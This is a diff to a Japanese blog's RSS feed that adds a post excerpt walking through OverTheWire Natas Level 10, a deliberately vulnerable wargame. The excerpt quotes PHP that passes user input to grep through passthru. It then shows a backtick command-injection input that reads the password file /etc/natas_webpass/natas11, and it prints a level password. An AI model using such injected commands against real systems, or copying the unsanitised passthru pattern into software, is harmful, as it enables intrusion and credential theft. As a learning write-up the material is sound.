@@ -6,7 +6,27 @@
     <description>Recent content in Posts on ただくんぶろぐ</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>ja</language>
-    <lastBuildDate>Mon, 05 Jul 2021 21:06:51 +0900</lastBuildDate><atom:link href="https://tadakun8.github.io/post/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Tue, 06 Jul 2021 20:44:23 +0900</lastBuildDate><atom:link href="https://tadakun8.github.io/post/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>【OverTheWire奮闘記】Natas: Level10〜11</title>
+      <link>https://tadakun8.github.io/post/over-the-wire/natas/level10-11/</link>
+      <pubDate>Tue, 06 Jul 2021 20:44:23 +0900</pubDate>
+      
+      <guid>https://tadakun8.github.io/post/over-the-wire/natas/level10-11/</guid>
+      <description>Level 10  Username: natas10
+URL: http://natas10.natas.labs.overthewire.org
+  Question 
+Answer U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK Answerまでにやったこと View sourcecodeを押すと
+&amp;lt;? $key = &amp;quot;&amp;quot;; if(array_key_exists(&amp;quot;needle&amp;quot;, $_REQUEST)) { $key = $_REQUEST[&amp;quot;needle&amp;quot;]; } if($key != &amp;quot;&amp;quot;) { if(preg_match(&#39;/[;|&amp;amp;]/&#39;,$key)) { print &amp;quot;Input contains an illegal character!&amp;quot;; } else { passthru(&amp;quot;grep -i $key dictionary.txt&amp;quot;); } } ?&amp;gt; preg_match関数は引数の正規表現にマッチしたらtrueを返すのでこの中で使われている記号を使わずにcat /etc/natas_webpass/natas11をしなくてはなりません。
+ちなみに/[;|&amp;amp;]/は[]の中身のどれか一つでも含まれていればマッチとみなされます。そのためコマンド連結は使えません。
+上記の記号以外でコマンド連結ができないか調べましたができなそうです。なので焦点をgrepに絞ってみました。man grepすると、grepしたいファイルは複数指定できることに気づきました。
+/etc/natas_webpass/natas11の中身で/etc/natas_webpass/natas11をgrepすればいいのではないかとひらめきました。
+・・・何を言っているかわからないとは思いますが、入力値は以下です。
+`cat /etc/natas_webpass/natas11` /etc/natas_webpass/natas11 こう打つとgrepのコマンドは以下のようになります
+grep -i `cat /etc/natas_webpass/natas11` /etc/natas_webpass/natas11 dictionary.txt cat /etc/natas_webpass/natas11の結果、つまりnatas11のパスワードで/etc/natas_webpass/natas11とdictionary.txtにgrepをかけているということに変換できます。
+ 入力後</description>
+    </item>
+    
     <item>
       <title>【OverTheWire奮闘記】Natas: Level7〜9</title>
       <link>https://tadakun8.github.io/post/over-the-wire/natas/level7-9/</link>
